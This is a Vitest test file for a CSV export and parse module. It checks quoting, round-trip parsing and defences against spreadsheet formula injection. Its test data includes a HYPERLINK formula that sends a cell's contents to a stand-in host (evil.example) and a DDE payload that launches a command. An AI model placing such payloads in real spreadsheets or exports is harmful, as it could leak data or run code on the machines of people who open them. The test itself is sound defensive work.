import { describe, it, expect } from 'vitest';
import { csvCell, csvRow, csvText, parseCsvLine, unguard, CSV_BOM } from './csv';

describe('csv — formula injection', () => {
  it('neutralises every dangerous leading character', () => {
    for (const payload of ['=1+1', '+1', '-1', '@SUM(A1)', '\tcmd', '\rcmd']) {
      const cell = csvCell(payload);
      expect(cell.startsWith('"\'')).toBe(true);          // quoted + apostrophe-guarded
      expect(cell).toContain(payload);
    }
  });

  it('leaves ordinary values untouched apart from quoting', () => {
    expect(csvCell('Aisha Nakato')).toBe('"Aisha Nakato"');
    expect(csvCell('S.1 West')).toBe('"S.1 West"');
    expect(csvCell('UGX 450,000')).toBe('"UGX 450,000"');
  });

  it('neutralises the classic HYPERLINK / DDE payloads', () => {
    const hyperlink = '=HYPERLINK("https://evil.example/?"&A1,"Invoice")';
    const dde = '=cmd|\' /c calc\'!A1';
    for (const p of [hyperlink, dde]) {
      const out = csvCell(p);
      expect(out).not.toMatch(/^"=/);                     // never starts a formula
      expect(out.startsWith('"\'=')).toBe(true);
    }
  });

  it('escapes embedded quotes rather than breaking out of the field', () => {
    expect(csvCell('He said "hi"')).toBe('"He said ""hi"""');
  });

  it('handles null/undefined/numbers', () => {
    expect(csvCell(null)).toBe('""');
    expect(csvCell(undefined)).toBe('""');
    expect(csvCell(1284)).toBe('"1284"');
  });
});

describe('csv — rows and documents', () => {
  it('joins a row and terminates a document with CRLF', () => {
    expect(csvRow(['a', 1])).toBe('"a","1"');
    expect(csvText([['a'], ['b']])).toBe('"a"\r\n"b"');
  });

  it('exposes a BOM for Excel encoding detection', () => {
    expect(CSV_BOM).toBe('\ufeff');
  });
});

describe('csv — parsing round-trips our own output', () => {
  it('reads quoted fields back intact', () => {
    expect(parseCsvLine('"Aisha Nakato",,"S.1 West"')).toEqual(['Aisha Nakato', '', 'S.1 West']);
  });

  it('reads doubled quotes back as one quote', () => {
    expect(parseCsvLine('"He said ""hi"""')).toEqual(['He said "hi"']);
  });

  it('reads a comma inside a quoted field as data', () => {
    expect(parseCsvLine('"UGX 450,000","Paid"')).toEqual(['UGX 450,000', 'Paid']);
  });

  it('survives a full export → import cycle, including a hostile name', () => {
    const hostile = '=HYPERLINK("http://evil","x")';
    const doc = csvText([['Student Name', 'Mathematics'], [hostile, '88']]);
    const [header, row] = doc.split('\r\n').map(parseCsvLine);
    expect(header).toEqual(['Student Name', 'Mathematics']);
    expect(unguard(row[0])).toBe(hostile);                // value preserved, safely
    expect(row[1]).toBe('88');
  });
});
